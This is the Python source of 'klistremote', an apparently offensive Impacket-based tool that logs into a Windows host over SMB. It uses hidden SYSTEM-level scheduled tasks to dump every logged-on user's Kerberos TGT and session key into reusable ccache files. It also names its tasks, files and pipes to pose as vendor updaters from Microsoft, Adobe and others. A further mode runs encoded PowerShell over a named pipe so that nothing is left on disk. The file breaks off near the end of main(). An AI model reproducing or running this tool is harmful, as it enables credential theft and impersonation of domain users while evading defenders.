#!/usr/bin/env python3
"""
klistremote – Remote Kerberos session listing and TGT dump via Task Scheduler + SMB

Connects to a Windows host via SMB + Task Scheduler, runs klist sessions and
klist tgt -li <id>, parses TGTs and writes MIT ccache files.
Default mode runs cmd.exe and writes output to a temp file via C$.
Use -named-pipes to stream output via PowerShell named pipe over SMB IPC$ (no files on disk).

Usage:
  klistremote list  [[domain/]username[:password]@]target [-named-pipes]
  klistremote dump  [[domain/]username[:password]@]target [-s N] [-o dir] [-named-pipes]
"""

from __future__ import print_function

import argparse
import base64
import logging
import os
import re
import struct
import random
import sys
import time
from datetime import datetime, timezone

# Impacket
from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, tsch
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import (
    RPC_C_AUTHN_GSS_NEGOTIATE,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
)


# ─── klist text parser ────────────────────────────────────────────────────────

def _parse_klist(text):
    """Parse output of `klist tgt [-li 0x...]` into a credential dict."""

    def field(pat, default=""):
        m = re.search(pat, text, re.IGNORECASE)
        return m.group(1).strip() if m else default

    def parse_time(s):
        if not s:
            return 0
        for fmt in ("%m/%d/%Y %H:%M:%S", "%m/%d/%Y %H:%M"):
            try:
                return int(
                    datetime.strptime(s.strip(), fmt)
                    .replace(tzinfo=timezone.utc)
                    .timestamp()
                )
            except ValueError:
                pass
        return 0

    ticket_hex = []
    for m in re.finditer(
        r"^[0-9a-fA-F]{4}\s+((?:[0-9a-fA-F]{2}[\s:])+)", text, re.MULTILINE
    ):
        ticket_hex.append(re.sub(r"[^0-9a-fA-F]", "", m.group(1)))
    ticket_bytes = bytes.fromhex("".join(ticket_hex)) if ticket_hex else b""

    # Kerberos key sizes (RFC 4120 + Windows etypes)
    _KEY_SIZES = {0x01: 8, 0x03: 8, 0x11: 16, 0x12: 32, 0x17: 16, 0x18: 16}

    key_type = int(field(r"KeyType\s+(0x[0-9a-fA-F]+)", "0x12"), 16)

    raw = re.sub(
        r"\s+",
        "",
        field(r"KeyLength\s+\d+\s+-\s+([0-9a-fA-F][0-9a-fA-F ]*)"),
    )
    try:
        raw_bytes = bytes.fromhex(raw) if raw else b""
    except ValueError:
        raw_bytes = b""

    # Credential Guard variant: the blob is a marshalled KerberosKeyWithMetadata
    # — self-size@0, typename-length@8, typename-offset@12 pointing at the literal
    # ASCII "KerberosKeyWithMetadata", key@28, then the typename + metadata tail.
    # Here offset 8 is NOT the etype, so fall back to the "KeyType 0x.." header.
    cred_guard = False
    key_bytes = b""
    if raw_bytes:
        if len(raw_bytes) >= 16 and struct.unpack_from("<I", raw_bytes, 0)[0] == len(raw_bytes):
            _TN = b"KerberosKeyWithMetadata"
            tn_len = struct.unpack_from("<I", raw_bytes, 8)[0]
            tn_off = struct.unpack_from("<I", raw_bytes, 12)[0]
            cred_guard = (
                tn_len == len(_TN)
                and 0 < tn_off <= len(raw_bytes) - len(_TN)
                and raw_bytes[tn_off:tn_off + len(_TN)] == _TN
            )
            # Non-CG SYSTEM blob: etype@8, cleartext key@28 — extract it.
            # CG blob: key material is wrapped/encrypted (protected in VTL1) and is
            # NOT recoverable offline, so do not treat offset-28 bytes as a key.
            if not cred_guard:
                etype_in_blob = struct.unpack_from("<I", raw_bytes, 8)[0]
                key_sz = _KEY_SIZES.get(etype_in_blob)
                if key_sz and len(raw_bytes) >= 28 + key_sz:
                    key_type = etype_in_blob
                    key_bytes = raw_bytes[28:28 + key_sz]
                    logging.debug("  Extracted %d-byte key (etype 0x%x) from metadata blob" % (key_sz, etype_in_blob))
        if not key_bytes:
            expected = _KEY_SIZES.get(key_type, 32)
            if len(raw_bytes) == expected:
                key_bytes = raw_bytes

    if not key_bytes:
        expected = _KEY_SIZES.get(key_type, 32)
        key_bytes = b"\x00" * expected
        logging.debug("  Session key unavailable; using %d zero bytes for etype 0x%x" % (expected, key_type))

    return {
        "client": field(r"ClientName\s*:\s*(.+)"),
        "realm": field(r"DomainName\s*:\s*(.+)"),
        "sname": [
            field(r"ServiceName\s*:\s*(.+)"),
            field(r"TargetDomainName\s*:\s*(.+)"),
        ],
        "flags": int(field(r"Ticket Flags\s*:\s*(0x[0-9a-fA-F]+)", "0x0"), 16),
        "key_type": key_type,
        "key_data": key_bytes,
        "cred_guard": cred_guard,
        "auth_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "start_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "end_time": parse_time(field(r"EndTime\s*:\s*(.+?)\s*\(local\)")),
        "renew_till": parse_time(field(r"RenewUntil\s*:\s*(.+?)\s*\(local\)")),
        "ticket_data": ticket_bytes,
    }


# ─── ccache writer (MIT credential cache v4) ─────────────────────────────────

def _write_ccache(info, path):
    def p16(n):
        return struct.pack(">H", n)

    def p32(n):
        return struct.pack(">I", n)

    def cnt(b):
        return p32(len(b)) + b

    def principal(name, realm, ntype=1):
        parts = name.split("/") if "/" in name else [name]
        out = p32(ntype) + p32(len(parts)) + cnt(realm.encode())
        for component in parts:
            out += cnt(component.encode())
        return out

    hdr = b"\x05\x04"
    tag = p16(1) + p16(8) + struct.pack(">I", 0xFFFFFFFF) + p32(0)
    hdr += p16(len(tag)) + tag

    default_p = principal(info["client"], info["realm"])
    cred = principal(info["client"], info["realm"])
    cred += principal("/".join(info["sname"]), info["realm"], 1)
    cred += p16(info["key_type"])
    cred += p16(0)
    cred += p16(len(info["key_data"])) + info["key_data"]
    cred += struct.pack(
        ">IIII",
        info["auth_time"],
        info["start_time"],
        info["end_time"],
        info["renew_till"],
    )
    cred += b"\x00"
    cred += p32(info["flags"])
    cred += p32(0)
    cred += p32(0)
    cred += cnt(info["ticket_data"])
    cred += cnt(b"")

    with open(path, "wb") as f:
        f.write(hdr + default_p + cred)
    return path


# ─── Session list parser ──────────────────────────────────────────────────────

SESSION_LINE = re.compile(
    r"\[\d+\]\s+Session\s+\d+\s+0:(0x[0-9a-fA-F]+)\s+(.+?)\s+Kerberos:\S+\s*$"
)


def parse_klist_sessions(text, include_computer=False):
    """Extract (logon_id_hex, account) for Kerberos sessions.

    Kerberos:Network sessions (machine/computer accounts) are excluded by
    default; pass include_computer=True to include them.
    """
    sessions = []
    for line in text.splitlines():
        line = line.strip()
        if "Kerberos" not in line:
            continue
        if "Kerberos:Network" in line and not include_computer:
            continue
        m = SESSION_LINE.search(line)
        if m:
            logon_hex = m.group(1).strip()
            account = m.group(2).strip()
            if logon_hex and account:
                sessions.append((logon_hex, account))
    return sessions


# ─── OPSEC helpers ────────────────────────────────────────────────────────────

_PRODUCTS = [
    "Microsoft", "Windows", "Office", "Edge", "OneDrive", "Defender", "Teams",
    "Outlook", "SharePoint", "Visual", "Excel", "Word", "PowerPoint", "Azure",
    "Adobe", "Acrobat", "Reader", "Creative", "Premiere", "Illustrator",
    "Google", "Chrome", "Drive", "Workspace", "Gemini",
    "Intel", "NVIDIA", "AMD", "Realtek", "Qualcomm",
    "Dell", "HP", "Lenovo", "Asus", "Acer", "Samsung",
    "Zoom", "Slack", "Dropbox", "Spotify", "Discord",
    "Java", "Oracle", "Citrix", "VMware", "Firefox",
    "DirectX", "DotNet", "Runtime", "Framework", "Steam",
]

_DESCRIPTORS = [
    "Update", "Updater", "Installer", "Setup", "Agent",
    "Manager", "Service", "Helper", "Host", "Runner",
    "Worker", "Launcher", "Monitor", "Sync", "Backup",
    "Repair", "Scanner", "Checker", "Validator", "Notifier",
    "Reporter", "Collector", "Dispatcher", "Handler", "Processor",
    "Controller", "Loader", "Scheduler", "Cleaner", "Detector",
    "Optimizer", "Configurator", "Deployer", "Registrar", "Resolver",
]

_COMPANY_MAP = {
    "Microsoft": "Microsoft Corporation",
    "Windows":   "Microsoft Corporation",
    "Office":    "Microsoft Corporation",
    "Edge":      "Microsoft Corporation",
    "OneDrive":  "Microsoft Corporation",
    "Defender":  "Microsoft Corporation",
    "Teams":     "Microsoft Corporation",
    "Outlook":   "Microsoft Corporation",
    "SharePoint":"Microsoft Corporation",
    "Visual":    "Microsoft Corporation",
    "Excel":     "Microsoft Corporation",
    "Word":      "Microsoft Corporation",
    "PowerPoint":"Microsoft Corporation",
    "Azure":     "Microsoft Corporation",
    "DirectX":   "Microsoft Corporation",
    "DotNet":    "Microsoft Corporation",
    "Runtime":   "Microsoft Corporation",
    "Framework": "Microsoft Corporation",
    "Adobe":     "Adobe Inc.",
    "Acrobat":   "Adobe Inc.",
    "Reader":    "Adobe Inc.",
    "Creative":  "Adobe Inc.",
    "Premiere":  "Adobe Inc.",
    "Illustrator":"Adobe Inc.",
    "Google":    "Google LLC",
    "Chrome":    "Google LLC",
    "Drive":     "Google LLC",
    "Workspace": "Google LLC",
    "Gemini":    "Google LLC",
    "Intel":     "Intel Corporation",
    "NVIDIA":    "NVIDIA Corporation",
    "AMD":       "Advanced Micro Devices, Inc.",
    "Realtek":   "Realtek Semiconductor Corp.",
    "Qualcomm":  "Qualcomm Technologies, Inc.",
    "Dell":      "Dell Inc.",
    "HP":        "HP Inc.",
    "Lenovo":    "Lenovo Group Limited",
    "Asus":      "ASUSTeK Computer Inc.",
    "Acer":      "Acer Inc.",
    "Samsung":   "Samsung Electronics Co., Ltd.",
    "Zoom":      "Zoom Video Communications, Inc.",
    "Slack":     "Slack Technologies, LLC",
    "Dropbox":   "Dropbox, Inc.",
    "Spotify":   "Spotify AB",
    "Discord":   "Discord Inc.",
    "Java":      "Oracle Corporation",
    "Oracle":    "Oracle Corporation",
    "Citrix":    "Citrix Systems, Inc.",
    "VMware":    "VMware, Inc.",
    "Firefox":   "Mozilla Foundation",
    "Steam":     "Valve Corporation",
}

_DESCRIPTION_TEMPLATES = [
    "{p} {d} component for system maintenance.",
    "Manages {p} {d} operations on this device.",
    "Handles {p} background {d} tasks.",
    "Ensures {p} {d} runs correctly on this machine.",
    "Responsible for {p} {d} and system integration.",
    "{p} {d} service for optimal performance.",
    "Performs scheduled {p} {d} routines.",
    "Maintains {p} installation and {d} state.",
    "Keeps {p} {d} current and functional.",
    "Provides {p} {d} support for end users.",
]

_TASK_PATTERNS = [
    "{p}{d}",
    "{p}{d}Task",
    "{p}{d}Core",
    "{p}_{d}",
    "{p}{d}Machine",
    "{p}{d}UA",
]

_FILE_EXTENSIONS = [".log", ".dat", ".bin", ".cache", ".etl", ".db"]

_FILE_PATTERNS = [
    "{p}{d}_{n}{e}",
    "{p}_{d}{e}",
    "{p}{d}{e}",
    "{p}_{d}_{n}{e}",
    "{p}{d}Setup_{n}{e}",
]

_PIPE_PATTERNS = [
    "{p}{d}",
    "{p}_{d}",
    "{p}{d}Svc",
    "{p}{d}Pipe",
    "{p}{d}Ch",
]


def _leet_names(use_pipes=False, product=None):
    """Pick one (product, descriptor) pair and return OPSEC-safe names."""
    p = product if product is not None else random.choice(_PRODUCTS)
    d = random.choice(_DESCRIPTORS)
    task_author = _COMPANY_MAP.get(p, "Microsoft Corporation")
    task_desc   = random.choice(_DESCRIPTION_TEMPLATES).format(p=p, d=d)
    task_name   = random.choice(_TASK_PATTERNS).format(p=p, d=d)
    if use_pipes:
        pipe_name = random.choice(_PIPE_PATTERNS).format(p=p, d=d)
        return task_name, task_author, task_desc, pipe_name
    n = random.randint(1000, 99999)
    e = random.choice(_FILE_EXTENSIONS)
    file_name = random.choice(_FILE_PATTERNS).format(p=p, d=d, n=n, e=e)
    return task_name, task_author, task_desc, file_name


TASK_START_BOUNDARY = "2015-07-15T20:35:13.2757294"
PIPE_EOF_SENTINEL   = "<#KEOF#>"
OUTPUT_SEP          = "KLISTSEP"


# ─── Task XML builder ─────────────────────────────────────────────────────────

def _xml_escape(data):
    replace_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    return "".join(replace_table.get(c, c) for c in data)


def _task_xml(author, desc, command, arguments, time_limit="PT1M"):
    return """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>%s</Author>
    <Description>%s</Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>%s</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>%s</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
""" % (
    _xml_escape(author), _xml_escape(desc), TASK_START_BOUNDARY,
    time_limit, _xml_escape(command), _xml_escape(arguments),
)


# ─── Remote execution via Task Scheduler + cmd.exe (file output) ─────────────

def run_remote_cmd_and_read_output(smb, dce, command, max_wait=60, retries=20, product=None):
    """
    Run `command` on target via Task Scheduler using cmd.exe.
    Output is written to C:\\ProgramData\\<file>, read via C$, then deleted.
    Returns decoded string content, or None on failure.
    """
    task_name, task_author, task_desc, temp_basename = _leet_names(product=product)
    logging.info("  task: \\%s  file: %s" % (task_name, temp_basename))

    args = '/c "' + command + ' > C:\\ProgramData\\' + temp_basename + '"'
    xml = _task_xml(task_author, task_desc, "cmd.exe", args, time_limit="PT1M")

    try:
        tsch.hSchRpcRegisterTask(dce, "\\" + task_name, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        tsch.hSchRpcRun(dce, "\\" + task_name)
    except Exception as e:
        logging.error("Task create/run failed: %s" % e)
        try:
            tsch.hSchRpcDelete(dce, "\\" + task_name)
        except Exception:
            pass
        return None

    deadline = time.time() + max_wait
    done = False
    while time.time() < deadline and not done:
        try:
            resp = tsch.hSchRpcGetLastRunInfo(dce, "\\" + task_name)
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
                break
        except Exception:
            pass
        time.sleep(2)

    try:
        tsch.hSchRpcDelete(dce, "\\" + task_name)
    except Exception:
        pass

    if not done:
        logging.error("Task did not complete in time")
        return None

    time.sleep(2)

    smb_share = "C$"
    smb_path = "ProgramData\\" + temp_basename
    result = None
    for attempt in range(retries):
        try:
            data = []
            smb.getFile(smb_share, smb_path, lambda d, off=0: data.append(d))
            result = b"".join(data).decode("utf-8", errors="replace")
            break
        except Exception as e:
            if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "0xc0000034" in str(e):
                if attempt < retries - 1:
                    time.sleep(3)
                    continue
            logging.error("Failed to read %s: %s" % (smb_path, e))
            return None

    if result is not None:
        try:
            smb.deleteFile(smb_share, smb_path)
        except Exception as e:
            logging.debug("Could not delete remote file %s: %s" % (smb_path, e))

    return result


# ─── Remote execution via Task Scheduler + PowerShell named pipe ──────────────

def _run_ps_via_pipe(smb, dce, ps_body, max_wait=90, pipe_timeout=45):
    """
    Run PowerShell via Task Scheduler + named pipe over SMB IPC$.
    ps_body is PS code with access to $w (StreamWriter). EOF sentinel is appended automatically.
    Returns raw output string (before EOF sentinel), or None on failure.
    """
    task_name, task_author, task_desc, pipe_name = _leet_names(use_pipes=True)
    logging.info("  task: \\%s  pipe: \\pipe\\%s" % (task_name, pipe_name))

    ps_cmd = (
        "$n='{pipe}';"
        "$p=New-Object System.IO.Pipes.NamedPipeServerStream"
        "($n,[System.IO.Pipes.PipeDirection]::InOut,1,"
        "[System.IO.Pipes.PipeTransmissionMode]::Byte,"
        "[System.IO.Pipes.PipeOptions]::None,65536,65536);"
        "$p.WaitForConnection();"
        "$w=New-Object System.IO.StreamWriter($p);"
        "$w.AutoFlush=$true;"
        "{body}"
        "$w.WriteLine('{eof}');"
        "$w.Flush();"
        "$w.Close();"
        "$p.Disconnect();"
        "$p.Close()"
    ).format(pipe=pipe_name, body=ps_body, eof=PIPE_EOF_SENTINEL)

    ps_b64  = base64.b64encode(ps_cmd.encode("utf-16-le")).decode("ascii")
    ps_args = "-NonInteractive -NoProfile -EncodedCommand " + ps_b64
    xml = _task_xml(task_author, task_desc, "powershell.exe", ps_args, time_limit="PT2M")

    try:
        tsch.hSchRpcRegisterTask(dce, "\\" + task_name, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        tsch.hSchRpcRun(dce, "\\" + task_name)
    except Exception as e:
        logging.error("Task create/run failed: %s" % e)
        try:
            tsch.hSchRpcDelete(dce, "\\" + task_name)
        except Exception:
            pass
        return None

    try:
        tid = smb.connectTree("IPC$")
    except Exception as e:
        logging.error("IPC$ connect failed: %s" % e)
        try:
            tsch.hSchRpcDelete(dce, "\\" + task_name)
        except Exception:
            pass
        return None

    deadline = time.time() + pipe_timeout
    fid = None
    while time.time() < deadline:
        try:
            fid = smb.openFile(tid, "\\" + pipe_name)
            logging.debug("Opened pipe \\pipe\\%s" % pipe_name)
            break
        except Exception:
            time.sleep(0.5)

    if fid is None:
        logging.error("Timed out waiting for pipe \\pipe\\%s" % pipe_name)
        try:
            smb.disconnectTree(tid)
        except Exception:
            pass
        try:
            tsch.hSchRpcDelete(dce, "\\" + task_name)
        except Exception:
            pass
        return None

    chunks = []
    found_eof = False
    while not found_eof:
        try:
            data = smb.readFile(tid, fid, bytesToRead=65535)
            if not data:
                break
            chunks.append(data)
            if PIPE_EOF_SENTINEL.encode() in b"".join(chunks):
                found_eof = True
        except Exception:
            break

    try:
        smb.closeFile(tid, fid)
    except Exception:
        pass
    try:
        smb.disconnectTree(tid)
    except Exception:
        pass

    deadline2 = time.time() + max_wait
    while time.time() < deadline2:
        try:
            resp = tsch.hSchRpcGetLastRunInfo(dce, "\\" + task_name)
            if resp["pLastRuntime"]["wYear"] != 0:
                break
        except Exception:
            pass
        time.sleep(1)

    try:
        tsch.hSchRpcDelete(dce, "\\" + task_name)
    except Exception:
        pass

    if not chunks:
        logging.error("No data received from pipe \\pipe\\%s" % pipe_name)
        return None

    result = b"".join(chunks).decode("utf-8", errors="replace")
    if PIPE_EOF_SENTINEL in result:
        result = result[: result.index(PIPE_EOF_SENTINEL)]
    return result.strip() or None


# ─── Higher-level session/TGT helpers ────────────────────────────────────────

def _get_sessions(smb, dce, debug=False, use_named_pipes=False, include_computer=False):
    """Run klist sessions on target and return parsed session list."""
    logging.info("Enumerating remote Kerberos sessions ...")
    if use_named_pipes:
        sessions_text = _run_ps_via_pipe(smb, dce, "klist sessions|%{$w.WriteLine($_)};")
    else:
        sessions_text = run_remote_cmd_and_read_output(smb, dce, "klist sessions")
    if sessions_text is None:
        return None
    if debug:
        print(sessions_text)
    return parse_klist_sessions(sessions_text, include_computer=include_computer)


def _get_sessions_and_tgts_via_pipe(smb, dce):
    """
    Single PS task: enumerate sessions and dump all TGTs.
    Returns (sessions_text, [tgt_text, ...]) — one tgt_text per session in order.
    Returns (None, None) on failure.
    """
    ps_body = (
        "$sep='{sep}';"
        "$sess=(klist sessions|Out-String).Trim();"
        "$w.WriteLine($sess);"
        "$w.WriteLine($sep);"
        "$lines=$sess-split\"`n\"|?{{$_-match'Kerberos'-and$_-notmatch'Kerberos:Network'}};"
        "$ids=$lines|%{{if($_-match'0:(0x[0-9a-fA-F]+)'){{$Matches[1]}}}}|?{{$_}}|Select-Object -Unique;"
        "foreach($id in $ids){{$t=(klist tgt -li $id|Out-String).Trim();$w.WriteLine($t);$w.WriteLine($sep)}};"
    ).format(sep=OUTPUT_SEP)

    raw = _run_ps_via_pipe(smb, dce, ps_body)
    if raw is None:
        return None, None

    parts = [p.strip() for p in raw.split(OUTPUT_SEP)]
    sessions_text = parts[0] if parts else ""
    tgt_texts = [p for p in parts[1:] if p]
    return sessions_text, tgt_texts


# ─── Shared auth argument builder ────────────────────────────────────────────

def _add_auth_args(parser):
    parser.add_argument(
        "-ts",
        action="store_true",
        help="Add timestamp to every logging output",
    )
    parser.add_argument(
        "-debug",
        action="store_true",
        help="Turn DEBUG output ON",
    )
    parser.add_argument(
        "-named-pipes",
        "--named-pipes",
        action="store_true",
        help="Stream command output via PowerShell named pipe over SMB IPC$ (no files on disk). Requires PowerShell 2.0+.",
    )
    parser.add_argument(
        "--computer",
        action="store_true",
        help="Include computer/machine account sessions (Kerberos:Network sessions, e.g. HOSTNAME$)",
    )
    group = parser.add_argument_group("authentication")
    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    group.add_argument(
        "-no-pass",
        action="store_true",
        help="Don't ask for password (useful for -k)",
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, "
        "it will use the ones specified in the command line",
    )
    group.add_argument(
        "-aesKey",
        action="store",
        metavar="hex key",
        help="AES key to use for Kerberos Authentication (128 or 256 bits)",
    )
    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If omitted it will use the domain "
        "part (FQDN) specified in the target parameter",
    )
    group.add_argument(
        "-keytab",
        action="store",
        help="Read keys for SPN from keytab file",
    )


# ─── Connection helper ────────────────────────────────────────────────────────

def _connect(args, domain, username, password, address, lmhash, nthash):
    stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % address
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    if hasattr(rpctransport, "set_credentials"):
        rpctransport.set_credentials(username, password, domain, lmhash, nthash, args.aesKey)
        rpctransport.set_kerberos(args.k, args.dc_ip)

    try:
        dce = rpctransport.get_dce_rpc()
        dce.set_credentials(*rpctransport.get_credentials())
        if args.k:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
    except Exception as e:
        logging.error("Task Scheduler connect/bind failed: %s" % e)
        sys.exit(1)

    smb = rpctransport.get_smb_connection()
    return dce, smb


# ─── Main flow ────────────────────────────────────────────────────────────────

def cmd_list(args):
    domain, username, password, address = parse_target(args.target)
    if domain is None:
        domain = ""

    if args.keytab is not None:
        from impacket.krb5.keytab import Keytab
        Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
        args.k = True

    if (
        password == ""
        and username != ""
        and args.hashes is None
        and args.no_pass is False
        and args.aesKey is None
    ):
        from getpass import getpass
        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    lmhash = ""
    nthash = ""
    if args.hashes:
        lmhash, nthash = args.hashes.split(":")

    logging.info("Connecting to %s ..." % address)
    dce, smb = _connect(args, domain, username, password, address, lmhash, nthash)

    sessions = _get_sessions(smb, dce, debug=args.debug, use_named_pipes=args.named_pipes, include_computer=args.computer)
    dce.disconnect()

    if sessions is None:
        sys.exit(1)

    if not sessions:
        logging.warning("No Kerberos sessions found")
        sys.exit(0)

    print()
    print("  Kerberos sessions on %s:\n" % address)
    w = max(len(a) for _, a in sessions)
    for i, (logon_hex, account) in enumerate(sessions, 1):
        print("  [%d]  %-*s  %s" % (i, w, account, logon_hex))
    print()


def cmd_dump(args):
    domain, username, password, address = parse_target(args.target)
    if domain is None:
        domain = ""

    if args.keytab is not None:
        from impacket.krb5.keytab import Keytab
        Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
        args.k = True

    if (
        password == ""
        and username != ""
        and args.hashes is None
        and args.no_pass is False
        and args.aesKey is None
    ):
        from getpass import getpass
        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    lmhash = ""
    nthash = ""
    if args.hashes:
        lmhash, nthash = args.hashes.split(":")

    os.makedirs(args.output_dir, exist_ok=True)

    logging.info("Connecting to %s ..." % address)
    dce, smb = _connect(args, domain, username, password, address, lmhash, nthash)

    # ── Enumerate sessions (and TGTs if using named pipes) ──────────────────
    if args.named_pipes:
        # Single pipe task: sessions + all TGTs at once
        logging.info("Enumerating sessions and dumping TGTs (single pipe) ...")
        sessions_text, all_tgt_texts = _get_sessions_and_tgts_via_pipe(smb, dce)
        dce.disconnect()
        if sessions_text is None:
            sys.exit(1)
        sessions = parse_klist_sessions(sessions_text, include_computer=args.computer)
    else:
        # Task 1 of 2: enumerate sessions via cmd
        _dump_product = random.choice(_PRODUCTS)
        sessions_text = run_remote_cmd_and_read_output(smb, dce, "klist sessions", product=_dump_product)
        if sessions_text is None:
            dce.disconnect()
            sys.exit(1)
        if args.debug:
            print(sessions_text)
        sessions = parse_klist_sessions(sessions_text, include_computer=args.computer)
        all_tgt_texts = None  # fetched below after filtering

    if not sessions:
        logging.warning("No Kerberos sessions found")
        if not args.named_pipes:
            dce.disconnect()
        sys.exit(0)

    # ── Apply -s N filter ────────────────────────────────────────────────────
    if args.session is not None:
        idx = args.session
        if idx < 1 or idx > len(sessions):
            logging.error(
                "Session %d out of range (1-%d). Use 'list' to see available sessions." % (idx, len(sessions))
            )
            if not args.named_pipes:
                dce.disconnect()
            sys.exit(1)
        to_dump = [sessions[idx - 1]]
        dump_indices = [idx - 1]
    else:
        to_dump = sessions
        dump_indices = list(range(len(sessions)))

    w = max(len(a) for _, a in to_dump)
    print()
    print("  Sessions to dump:\n")
    for i, (logon_hex, account) in enumerate(to_dump, 1):
        print("  [%d]  %-*s  %s" % (i, w, account, logon_hex))
    print()

    # ── Fetch TGT text(s) ────────────────────────────────────────────────────
    if args.named_pipes:
        # Select only the TGT texts that correspond to the sessions we're dumping
        tgt_texts = [all_tgt_texts[i] for i in dump_indices if i < len(all_tgt_texts)]
    else:
        # Task 2 of 2: all TGTs in a single combined cmd task
        cmds = ["klist tgt -li %s" % lhex for lhex, _ in to_dump]
        if len(cmds) == 1:
            combined_cmd = cmds[0]
        else:
            sep_join = " & echo %s & " % OUTPUT_SEP
            combined_cmd = "(" + sep_join.join(cmds) + ")"
        logging.info("Dumping %d TGT(s) in one task ..." % len(cmds))
        combined_out = run_remote_cmd_and_read_output(smb, dce, combined_cmd, product=_dump_product)
        dce.disconnect()
        tgt_texts = [p.strip() for p in combined_out.split(OUTPUT_SEP)] if combined_out else []

    # ── Write ccache files ───────────────────────────────────────────────────
    written = []
    for i, ((logon_hex, account), tgt_text) in enumerate(zip(to_dump, tgt_texts), 1):
        print()
        logging.info("[%d/%d] %s (%s) ..." % (i, len(to_dump), account, logon_hex))
        if not tgt_text:
            logging.error("  No output for %s" % account)
            continue
        info = _parse_klist(tgt_text)
        if not info["ticket_data"]:
            logging.error("  No ticket data found for %s" % account)
            continue
        if info.get("cred_guard"):
            logging.error("  %s: session key is Credential Guard-protected (wrapped in VTL1); "
                          "cannot export a usable ccache. Skipping." % account)
            continue

        now = time.time()

        if info["end_time"]:
            etime = datetime.fromtimestamp(info["end_time"]).isoformat()
            logging.info("  EndTime: %s", etime)

        if info["renew_till"]:
            rtime = datetime.fromtimestamp(info["renew_till"]).isoformat()
            logging.info("  Renew Until: %s", rtime)
            if info["renew_till"] < now:          
                logging.info("  Expired Ticket!")
                continue
              
        safe_name = re.sub(r"[^\w@.-]", "_", "%s@%s" % (info["client"], info["realm"]))
        out_path = os.path.join(args.output_dir, safe_name + ".ccache")
        if os.path.exists(out_path):
            idx2 = 1
            while os.path.exists(out_path):
                out_path = os.path.join(args.output_dir, "%s_%d.ccache" % (safe_name, idx2))
                idx2 += 1
        _write_ccache(info, out_path)
        written.append(out_path)
        logging.info("  -> %s" % out_path)

    if written:
        logging.info("Done. %d ccache(s) written to %s" % (len(written), args.output_dir))
    else:
        logging.error("No ccache files written")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="Remote Kerberos session listing and TGT dump via Task Scheduler + SMB",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    subparsers = parser.add_subparsers(dest="mode", metavar="mode")
    subparsers.required = True

    # ── list subcommand ──────────────────────────────────────────────────────
    list_parser = subparsers.add_parser(
        "list",
        help="List active Kerberos sessions on the target",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    list_parser.add_argument(
        "target",
        help="[[domain/]username[:password]@]target",
    )
    _add_auth_args(list_parser)

    # ── dump subcommand ──────────────────────────────────────────────────────
    dump_parser = subparsers.add_parser(
        "dump",
        help="Dump TGTs for Kerberos sessions (all, or a specific session number)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    dump_parser.add_argument(
        "target",
        help="[[domain/]username[:password]@]target",
    )
    dump_parser.add_argument(
        "-s", "--session",
        type=int,
        default=None,
        metavar="N",
        help="Session number to dump (1-based, from 'list'). Omit to dump all sessions.",
    )
    dump_parser.add_argument(
        "-o", "--output-dir",
        default=".",
        help="Directory to write .ccache files (default: current directory)",
    )
    _add_auth_args(dump_parser)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    print(version.BANNER)
    logger.init(args.ts)
    if args.debug:
